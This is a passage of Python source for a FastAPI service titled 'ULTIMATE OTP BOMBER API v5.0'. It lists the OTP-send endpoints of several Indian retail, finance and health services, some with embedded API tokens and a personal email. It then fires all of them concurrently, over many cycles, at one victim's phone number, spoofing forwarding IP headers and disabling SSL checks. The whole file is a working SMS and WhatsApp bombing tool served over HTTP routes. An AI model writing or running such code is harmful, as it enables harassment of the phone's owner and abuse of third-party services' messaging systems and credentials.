            "referer": "https://app.shiprocket.in/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
        },
        "data": lambda p: f'{{"mobileNumber":"{p}"}}'
    },
    {
        "name": "gokwik_2",
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "gk-version": "20250421065835697",
            "gk-signature": "076108",
            "gk-udf-1": "951",
            "gk-request-id": "a0cecd38-e690-48d5-ab80-b9d2feed3761",
            "gk-merchant-id": "19g6jlc658iad",
            "origin": "https://pdp.gokwik.co",
            "referer": "https://pdp.gokwik.co/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
        },
        "data": lambda p: f'{{"phone":"{p}","country":"in"}}'
    },
    {
        "name": "jockey_sms_2",
        "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/send-otp/+91{p}?whatsapp=false",
        "method": "GET",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
            "Referer": "https://www.jockey.in/"
        },
        "data": None
    },
    {
        "name": "jockey_wa_2",
        "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{p}?whatsapp=true",
        "method": "GET",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
            "Referer": "https://www.jockey.in/"
        },
        "data": None
    },
    {
        "name": "newme_2",
        "url": "https://prodapi.newme.asia/web/otp/request",
        "method": "POST",
        "headers": {
            "Timestamp": "{timestamp}",
            "Caller": "web_app",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "Origin": "https://newme.asia",
            "Referer": "https://newme.asia/"
        },
        "data": lambda p: f'{{"mobile_number":"{p}","resend_otp_request":true}}'
    },
    {
        "name": "univest_2",
        "url": lambda p: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={p}",
        "method": "GET",
        "headers": {
            "User-Agent": "okhttp/3.9.1"
        },
        "data": None
    },
    {
        "name": "rappi_mx_2",
        "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json; charset=utf-8",
            "User-Agent": "okhttp/3.9.1"
        },
        "data": lambda p: f'{{"country_code":"+91","phone":"{p}"}}'
    },
    {
        "name": "foxy_2",
        "url": "https://www.foxy.in/api/v2/users/send_otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Platform": "web",
            "Origin": "https://www.foxy.in",
            "X-Guest-Token": "01943c60-aea9-7ddc-b105-e05fbcf832be",
            "Referer": "https://www.foxy.in/onboarding",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
        },
        "data": lambda p: f'{{"guest_token":"01943c60-aea9-7ddc-b105-e05fbcf832be","user":{{"phone_number":"+91{p}"}},"device":null,"invite_code":""}}'
    },
    {
        "name": "eka_care_2",
        "url": "https://auth.eka.care/auth/init",
        "method": "POST",
        "headers": {
            "Device-Id": "5df83c463f0ff8ff",
            "Flavour": "android",
            "Content-Type": "application/json; charset=UTF-8",
            "User-Agent": "okhttp/4.9.3"
        },
        "data": lambda p: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{p}"}},"type":"mobile"}}'
    },
    {
        "name": "foxy_wa_2",
        "url": "https://www.foxy.in/api/v2/users/send_otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Platform": "web",
            "Origin": "https://www.foxy.in",
            "X-Guest-Token": "01943c60-aea9-7ddc-b105-e05fbcf832be",
            "Referer": "https://www.foxy.in/onboarding",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
        },
        "data": lambda p: f'{{"user":{{"phone_number":"+91{p}"}},"via":"whatsapp"}}'
    },
    {
        "name": "smytten_2",
        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Origin": "https://smytten.com",
            "Referer": "https://smytten.com/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
        },
        "data": lambda p: f'{{"ad_id":"","device_info":{{}},"device_id":"","app_version":"","device_token":"","device_platform":"web","phone":"{p}","email":"sdhabai09@gmail.com"}}'
    },
    {
        "name": "wakefit_3",
        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.wakefit.co",
            "Referer": "https://www.wakefit.co/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
            "API-Secret-Key": "ycq55IbIjkLb",
            "API-Token": "c84d563b77441d784dce71323f69eb42"
        },
        "data": lambda p: f'{{"mobile":"{p}","whatsapp_opt_in":1}}'
    },
    {
        "name": "caratlane_2",
        "url": "https://www.caratlane.com/cg/dhevudu",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
            "Origin": "https://www.caratlane.com",
            "Referer": "https://www.caratlane.com/register",
            "Authorization": "b945ebaf43ed7541d49cfd60bd82b81908edff8d465caecfe58deef209",
            "X-Authorization": "b945ebaf43ed7541d49cfd60bd82b81908edff8d465caecfe58deef209"
        },
        "data": lambda p: f'{{"query":"mutation {{SendOtp(input: {{mobile: \\"{p}\\", isdCode: \\"91\\", otpType: \\"registerOtp\\"}}) {{status {{message code}}}}}}"}}'
    },
]

print(f"✅ Loaded {len(ULTIMATE_APIS)} APIs")


# ═══════════════════════════════════════════════════════════
# 💣 FIRE ONE
# ═══════════════════════════════════════════════════════════
async def fire_one(session, api, phone, stats):
    try:
        headers = dict(api["headers"])
        headers["X-Forwarded-For"] = "103.159.84.134"
        headers["Client-IP"] = "103.159.84.134"

        url = api["url"](phone) if callable(api["url"]) else api["url"]
        data = api["data"](phone) if api.get("data") else None

        method = api["method"].upper()
        if method == "POST":
            async with session.post(url, headers=headers, data=data, ssl=False) as r:
                status = r.status
                try: text = await r.text()
                except: text = ""
        else:
            async with session.get(url, headers=headers, ssl=False) as r:
                status = r.status
                try: text = await r.text()
                except: text = ""

        stats["total"] += 1
        if status < 400:
            stats["http_ok"] += 1
            low = text[:300].lower()
            if any(k in low for k in OTP_KEYWORDS):
                stats["otp_ok"] += 1
        else:
            stats["failed"] += 1
    except Exception:
        stats["total"] += 1
        stats["failed"] += 1


# ═══════════════════════════════════════════════════════════
# 💣 WORKER — 5000 CONCURRENT
# ═══════════════════════════════════════════════════════════
async def bomb_worker(job_id: str, phone: str, count: int):
    _stop_numbers.discard(phone)

    connector = aiohttp.TCPConnector(
        limit=MAX_CONCURRENT, limit_per_host=200,
        ttl_dns_cache=300, force_close=False,
        enable_cleanup_closed=True,
    )
    timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT, connect=CONNECT_TIMEOUT)
    headers_base = {"Connection": "keep-alive", "Accept-Encoding": "gzip, deflate"}

    stats = _global_stats[phone]
    stats["total"] = stats["http_ok"] = stats["otp_ok"] = stats["failed"] = 0
    stats["start"] = time.time()

    print(f"\n{'='*70}")
    print(f"[{job_id}] 🔥 SUPER FLASH BOMB | +91{phone} | count={count}")
    print(f"[{job_id}] {len(ULTIMATE_APIS)} APIs | workers={MAX_CONCURRENT}")
    print(f"{'='*70}")

    try:
        async with aiohttp.ClientSession(
            connector=connector, timeout=timeout, headers=headers_base
        ) as session:
            for cycle in range(count):
                if phone in _stop_numbers:
                    print(f"[{job_id}] 🛑 Stopped at cycle {cycle+1}")
                    break
                tasks = [fire_one(session, api, phone, stats) for api in ULTIMATE_APIS]
                await asyncio.gather(*tasks, return_exceptions=True)
                elapsed = time.time() - stats["start"]
                rps = stats["total"] / elapsed if elapsed else 0
                print(f"[{job_id}] Cycle {cycle+1}/{count} | Total={stats['total']} | "
                      f"HTTP_OK={stats['http_ok']} | OTP={stats['otp_ok']} | {rps:.1f}/s")
                await asyncio.sleep(0.05)
    except Exception as e:
        print(f"[{job_id}] ❌ {e}")
    finally:
        _running_jobs.pop(job_id, None)
        print(f"[{job_id}] ✅ DONE | Total={stats['total']} | "
              f"HTTP_OK={stats['http_ok']} | OTP={stats['otp_ok']} | Failed={stats['failed']}")


# ═══════════════════════════════════════════════════════════
# 🌐 ROUTES
# ═══════════════════════════════════════════════════════════
@app.get("/", response_class=HTMLResponse)
async def root():
    return f"""
    <html><head><title>ULTIMATE OTP BOMBER v5.0</title></head>
    <body style="font-family:monospace;background:#111;color:#0f0;padding:20px">
    <h1>🔥 ULTIMATE OTP BOMBER API v5.0</h1>
    <p>Status: <b>ONLINE</b></p>
    <p>APIs: <b>{len(ULTIMATE_APIS)}</b> | Workers: <b>5000</b></p>
    <h3>Endpoints:</h3>
    <ul>
      <li><a href="/health" style="color:#0ff">/health</a></li>
      <li><a href="/apis" style="color:#0ff">/apis</a></li>
      <li><a href="/send?number=9876543210&count=10" style="color:#0ff">/send?number=9876543210&count=10</a></li>
      <li><a href="/stop?number=9876543210" style="color:#0ff">/stop?number=9876543210</a></li>
      <li><a href="/stats?number=9876543210" style="color:#0ff">/stats?number=9876543210</a></li>
    </ul>
    </body></html>
    """


@app.get("/health")
async def health():
    return {
        "status": "ok",
        "total_apis": len(ULTIMATE_APIS),
        "max_workers": MAX_CONCURRENT,
        "time": datetime.now().isoformat(),
    }


@app.get("/apis")
async def list_apis():
    return {"total": len(ULTIMATE_APIS), "apis": [a["name"] for a in ULTIMATE_APIS]}


@app.get("/send")
async def send_endpoint(
    bg: BackgroundTasks,
    number: str = Query(..., description="10 digit phone"),
    count: int = Query(1, description="cycles"),
):
    number = number.strip().replace("+", "").replace(" ", "").replace("-", "")

    if not number.isdigit() or len(number) != 10:
        return JSONResponse({"success": False, "error": "Invalid number"}, 400)
    if count <= 0 or count > 10000:
        return JSONResponse({"success": False, "error": "count must be 1-10000"}, 400)

    job_id = str(uuid4())[:8]
    _running_jobs[job_id] = {"number": number, "count": count}
    bg.add_task(bomb_worker, job_id, number, count)

    return {
        "success": True,
        "job_id": job_id,
        "target": f"+91{number}",
        "count": count,
        "apis": len(ULTIMATE_APIS),
        "total_requests": count * len(ULTIMATE_APIS),
        "workers": MAX_CONCURRENT,
        "stop_url": f"/stop?number={number}",
        "stats_url": f"/stats?number={number}",
    }


@app.get("/stop")
async def stop_endpoint(number: str = Query(...)):
    number = number.strip().replace("+", "").replace(" ", "").replace("-", "")
    _stop_numbers.add(number)
    killed = [jid for jid, job in list(_running_jobs.items()) if job["number"] == number]
    return {"success": True, "message": f"🛑 Stop for +91{number}", "killed_jobs": killed}


@app.get("/stats")
async def stats_endpoint(number: str = Query(...)):
    number = number.strip().replace("+", "").replace(" ", "").replace("-", "")
    s = _global_stats.get(number, {})
    if not s:
        return {"success": False, "error": "no stats"}
    elapsed = time.time() - s.get("start", time.time())
    rps = s["total"] / elapsed if elapsed else 0
    return {
        "success": True, "number": f"+91{number}",
        "total": s.get("total", 0), "http_ok": s.get("http_ok", 0),
        "otp_ok": s.get("otp_ok", 0), "failed": s.get("failed", 0),
        "elapsed": round(elapsed, 2), "rps": round(rps, 1),
    }


# ═══════════════════════════════════════════════════════════
# 🚀 RUN (Local)
# ═══════════════════════════════════════════════════════════
if __name__ == "__main__":
    print(f"""
╔══════════════════════════════════════════════════════════╗
║   🔥 ULTIMATE OTP BOMBER API v5.0 — ALL-IN-ONE          ║
║   ▸ APIs loaded   : {len(ULTIMATE_APIS)}
║   ▸ Max workers   : {MAX_CONCURRENT}
║   ▸ Server        : http://0.0.0.0:5000
║   ▸ Test          : http://localhost:5000/send?number=9876543210&count=100
╚══════════════════════════════════════════════════════════╝
    """)
    uvicorn.run(app, host="0.0.0.0", port=5000, log_level="warning", access_log=False)
